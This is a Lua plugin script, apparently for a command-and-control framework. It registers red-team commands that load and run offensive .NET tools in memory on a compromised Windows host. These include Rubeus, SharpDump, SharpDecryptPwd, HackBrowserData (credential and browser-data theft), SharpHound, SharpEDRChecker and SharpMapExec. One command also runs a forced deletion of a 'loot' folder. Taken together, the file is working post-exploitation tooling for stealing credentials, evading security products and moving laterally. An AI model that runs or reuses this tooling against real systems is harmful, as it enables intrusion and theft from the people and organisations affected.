local time = require("time")
local strings = require("strings")
local rt = {}
rt.parent_command = "rt"
function new_sac()
    local sac = new_sacrifice(0,false,false,false,"")
end
local function command_register(command_name, command_function, help_string, ttp)
    command(rt.parent_command .. ":" .. command_name, command_function, help_string, ttp)
end
-- adcollector
function rt.ADcollector()
    local session = active()
    local file_path = "RTKit/recon/ADcollector_net4.0.exe"
    return execute_assembly(session, script_resource(file_path), {}, true, false, false)
end
command_register("ADcollector_net4.0", rt.ADcollector, "ADcollector", "")
-- hack browser data todo
function rt.HackBrowserData()
    local session = active()
    local randomname = random_string(32)
    local fullpipename = "\\\\.\\pipe\\" .. randomname
    print("Pipe name: " .. fullpipename)

    --local arg = "-e " .. fullpipename .. " -s c:\\windows\\system32\\notepad.exe --disable-bypass-cmdline --disable-bypass-amsi --disable-bypass-etw -a\"-i0.0.0.0 -p20020\""
    --local args = {"-e", fullpipename, "-s", "c:\\windows\\system32\\notepad.exe", "--disable-bypass-cmdline", "--disable-bypass-amsi", "--disable-bypass-etw", "-a", "-i0.0.0.0 -p20020"}
    local args = {"-e", fullpipename, "-s", "c:\\windows\\system32\\notepad.exe", "--disable-bypass-cmdline", "--disable-bypass-amsi", "--disable-bypass-etw"}

    local sharpblock_file = "RTKit/SharpBlock_net4.0.exe"
    local result = execute_assembly(session, script_resource(sharpblock_file), args, true, false, false)
    print("SharpBlock result: " .. result)

    local hack_browser_data_file = script_resource("RTKit/recon/HackBrowserData." .. session.Os.Arch .. ".exe")
    local hack_browser_data_content = base64_encode(read(hack_browser_data_file))
    buploadraw(session, fullpipename, hack_browser_data_content,0744, false)
    -- for 5 次
    for i = 1, 5 do
        time.sleep(0.1)
        buploadraw(session, fullpipename, "ok","")
    end
    print("HackBrowserData end")
end
command_register("HackBrowserData", rt.HackBrowserData, "HackBrowserData", "")

-- ListRDPConnections_net4.5
function rt.ListRDPConnections_net4_5()
    local session = active()
    local list_rdp_connections_net4_5_path = "RTKit/recon/ListRDPConnections_net4.5.exe"
    return execute_assembly(session, script_resource(list_rdp_connections_net4_5_path), {}, true, false, false)
end
command_register("ListRDPConnections_net_4.5", rt.ListRDPConnections_net4_5, "ListRDPConnections_net4_5", "")
-- end ListRDPConnections_net4.5

-- PVEFINDADUser_net2.0.exe todo
function rt.PVEFINDADUser_net2_0()
    local session = active()
    local pvefindaduser_net2_0_path = "RTKit/recon/PVEFINDADUser_net2.0.exe"
    local arg = "-current"
    local result = execute_assembly(session, script_resource(pvefindaduser_net2_0_path), {arg}, true, false, false)

end
command_register("PVEFINDADUser_net2.0", rt.PVEFINDADUser_net2_0, "PVEFINDADUser_net2.0", "")
-- end PVEFINDADUser_net2.0.exe

-- Rubeus2.0_Net4.5.exe
function rt.Rubeus2_0_Net4_5(args)
    local session = active()
    local rubeus2_0_net4_5_path = "RTKit/recon/Rubeus2.0_Net4.5.exe"
    return execute_assembly(session, script_resource(rubeus2_0_net4_5_path), args, true, false, false)
end
command_register("Rubeus2.0_Net4.5", rt.Rubeus2_0_Net4_5, "Rubeus2.0_Net4.5", "")
-- end Rubeus2.0_Net4.5.exe

-- Rubeus2.0_Net4.exe
function rt.Rubeus2_0_Net4()
    local session = active()
    local rubeus2_0_net4_path = "RTKit/recon/Rubeus2.0_Net4.exe"
    return execute_assembly(session, script_resource(rubeus2_0_net4_path), args, true, false, false)
end
command_register("Rubeus2.0_Net4", rt.Rubeus2_0_Net4, "Rubeus2.0_Net4", "")
-- end Rubeus2.0_Net4.exe

-- Seatbelt.exe
function rt.Seatbelt()
    local session = active()
    local seatbelt_path = "RTKit/recon/Seatbelt.exe"
    return execute_assembly(session, script_resource(seatbelt_path), {}, true, false, false)
end
command_register("Seatbelt", rt.Seatbelt, "Seatbelt", "")
-- end Seatbelt.exe

-- SharpAidnsdump_net4.0.exe
function rt.SharpAidnsdump_net4_0()
    local session = active()
    local sharpaidnsdump_net4_0_path = "RTKit/recon/SharpAidnsdump_net4.0.exe"
    return execute_assembly(session, script_resource(sharpaidnsdump_net4_0_path), {}, true, false, false)
end
command_register("SharpAidnsdump_net4.0", rt.SharpAidnsdump_net4_0, "SharpAidnsdump_net4.0", "")
-- end SharpAidnsdump_net4.0.exe

-- SharpDecryptPwd.exe todo
function rt.SharpDecryptPwd(args)
    local session = active()
    print(args[1])
    local sharpdecryptpwd_path = "RTKit/recon/SharpDecryptPwd.exe"
    return execute_assembly(session, script_resource(sharpdecryptpwd_path), {args[1]}, true, false, false)
end
command_register("SharpDecryptPwd", rt.SharpDecryptPwd, "SharpDecryptPwd", "")
-- end SharpDecryptPwd.exe

-- SharpDetectionTLMSSP_net4.0.exe
function rt.SharpDetectionTLMSSP_net4_0(args)
    local session = active()
    local sharpdetectiontlmssp_net4_0_path = "RTKit/recon/SharpDetectionTLMSSP_net4.0.exe"
    return execute_assembly(session, script_resource(sharpdetectiontlmssp_net4_0_path), args, true, false, false)
end
command_register("SharpDetectionTLMSSP_net4.0", rt.SharpDetectionTLMSSP_net4_0, "SharpDetectionTLMSSP_net4.0", "")
-- end SharpDetectionTLMSSP_net4.0.exe

-- SharpDirLister.exe
function rt.SharpDirLister(args)
    local session = active()
    local sharpdirlister_path = "RTKit/recon/SharpDirLister.exe"
    return execute_assembly(session, script_resource(sharpdirlister_path), args, true, false, false)
end
command_register("SharpDirLister", rt.SharpDirLister, "SharpDirLister", "")
-- end SharpDirLister.exe

-- SharpDump_net2.0.exe
function rt.SharpDump_net2_0()
    local session = active()
    local sharpdump_net2_0_path = "RTKit/recon/SharpDump_net2.0.exe"
    return execute_assembly(session, script_resource(sharpdump_net2_0_path), {}, true, false, false)
end
command_register("SharpDump_net2.0", rt.SharpDump_net2_0, "SharpDump_net2.0", "")
-- end SharpDump_net2.0.exe

-- SharpEDRChecker_net4.0.exe
function rt.SharpEDRChecker_net4_0()
    local session = active()
    local sharpedrchecker_net4_0_path = "RTKit/recon/SharpEDRChecker_net4.0.exe"
    return execute_assembly(session, script_resource(sharpedrchecker_net4_0_path), {}, true, false, false)
end
command_register("SharpEDRChecker_net4.0", rt.SharpEDRChecker_net4_0, "SharpEDRChecker_net4.0", "")
-- end SharpEDRChecker_net4.0.exe

-- SharpEventLog3.5.exe
function rt.SharpEventLog3_5()
    local session = active()
    local sharpeventlog3_5_path = "RTKit/recon/SharpEventLog3.5.exe"
    local arg = "-4624"
    return execute_assembly(session, script_resource(sharpeventlog3_5_path), {arg}, true, false, false)
end
command_register("SharpEventLog3.5", rt.SharpEventLog3_5, "SharpEventLog3.5", "")
-- end SharpEventLog3.5.exe

-- SharpEventLog_net4.0.exe
function rt.SharpEventLog_net4_0()
    local session = active()
    local sharpeventlog_net4_0_path = "RTKit/recon/SharpEventLog_net4.0.exe"
    local arg = "-4624"
    return execute_assembly(session, script_resource(sharpeventlog_net4_0_path), {arg}, true, false, false)
end
command_register("SharpEventLog_net4.0", rt.SharpEventLog_net4_0, "SharpEventLog_net4.0", "")
-- end SharpEventLog_net4.0.exe

-- SharpHound_net4.5.exe
function rt.SharpHound_net4_0()
    local session = active()
    local sharphound_net4_0_path = "RTKit/recon/SharpHound_net4.5.exe"
    local arg = "-c all --RandomizeFilenames --NoSaveCache --EncryptZip"
    local args = strings.split(arg, " ")
    return execute_assembly(session, script_resource(sharphound_net4_0_path), args, true, false, false)
end
command_register("SharpHound_net4.0", rt.SharpHound_net4_0, "SharpHound_net4.0", "")
-- end SharpHound_net4.0.exe

-- SharpInstallSoft_net3.5.exe
function rt.SharpInstallSoft_net3_5()
    local session = active()
    local sharpinstallsoft_net3_5_path = "RTKit/recon/SharpInstallSoft_net3.5.exe"
    return execute_assembly(session, script_resource(sharpinstallsoft_net3_5_path), {}, true, false, false)
end
command_register("SharpInstallSoft_net3.5", rt.SharpInstallSoft_net3_5, "SharpInstallSoft_net3.5", "")
-- end SharpInstallSoft_net3.5.exe

-- SharpMapExec_net4.0.exe
function rt.SharpMapExec_net4_0(args)
    local session = active()
    local sharpmapexec_net4_0_path = "RTKit/recon/SharpMapExec_net4.0.exe"
    execute_assembly(session, script_resource(sharpmapexec_net4_0_path), args, true, false, false)
    bshell(session, "del /f /s /q loot") -- todo
end
command_register("SharpMapExec_net4.0", rt.SharpMapExec_net4_0, "SharpMapExec_net4.0", "")
-- end SharpMapExec_net4.0.exe

-- SharpOXID-Find_net4.0.exe
function rt.SharpOXID_Find_net4_0(args)
    local session = active()
    local sharpoxid_find_net4_0_path = "RTKit/recon/SharpOXID-Find_net4.0.exe"
    return execute_assembly(session, script_resource(sharpoxid_find_net4_0_path), args, true, false, false)
end
command_register("SharpOXID-Find_net4.0", rt.SharpOXID_Find_net4_0, "SharpOXID-Find_net4.0", "")
-- end SharpOXID-Find_net4.0.exe

-- SharpRDPCheck_net4.6.exe
function rt.SharpRDPCheck_net4_6(args)
    local session = active()
    local sharprdpcheck_net4_6_path = "RTKit/recon/SharpRDPCheck_net4.6.exe"
    return execute_assembly(session, script_resource(sharprdpcheck_net4_6_path), args, true, false, false)
end
command_register("SharpRDPCheck_net4.6", rt.SharpRDPCheck_net4_6, "SharpRDPCheck_net4.6", "")
-- end SharpRDPCheck_net4.6.exe

-- SharpSearch_net3.5.exe
function rt.SharpSearch_net3_5(args)
    local session = active()
    local sharpsearch_net3_5_path = "RTKit/recon/SharpSearch_net3.5.exe"
    return execute_assembly(session, script_resource(sharpsearch_net3_5_path), args, true, false, false)
end
command_register("SharpSearch_net3.5", rt.SharpSearch_net3_5, "SharpSearch_net3.5", "")
-- end SharpSearch_net3.5.exe

-- SharpShares_net4.0.exe
function rt.SharpShares_net4_0(args)
    local session = active()
    local sharpshares_net4_0_path = "RTKit/recon/SharpShares_net4.0.exe"
    return execute_assembly(session, script_resource(sharpshares_net4_0_path), args, true, false, false)
end
command_register("SharpShares_net4.0", rt.SharpShares_net4_0, "SharpShares_net4.0", "")
-- end SharpShares_net4.0.exe

-- SharpShares_sample.exe
function rt.SharpShares_sample(args)
    local session = active()
    if args[1] ~= "ips" and args[1] ~= "shares" then
        error("Invalid argument")
    end
    local sharpshares_sample_path = "RTKit/recon/SharpShares_sample.exe"
    return execute_assembly(session, script_resource(sharpshares_sample_path), {arg[1]}, true, false, false)
end
command_register("SharpShares_sample", rt.SharpShares_sample, "SharpShares_sample", "")
-- end SharpShares_sample.exe

-- Sharpwmi_net4.0.exe
function rt.Sharpwmi_net4_0()
    local session = active()
    local sharpwmi_net4_0_path = "RTKit/recon/Sharpwmi_net4.0.exe"
    return execute_assembly(session, script_resource(sharpwmi_net4_0_path), {}, true, false, false)
end
command_register("Sharpwmi_net4.0", rt.Sharpwmi_net4_0, "Sharpwmi_net4.0", "")
-- end Sharpwmi_net4.0.exe

-- SharpWxDump.exe
function rt.SharpWxDump(args)
    local session = active()
    local sharpwxdump_path = "RTKit/recon/SharpWxDump.exe"
    return execute_assembly(session, script_resource(sharpwxdump_path), args, true, false, false)
end
command_register("SharpWxDump", rt.SharpWxDump, "SharpWxDump", "")
-- end SharpWxDump.exe
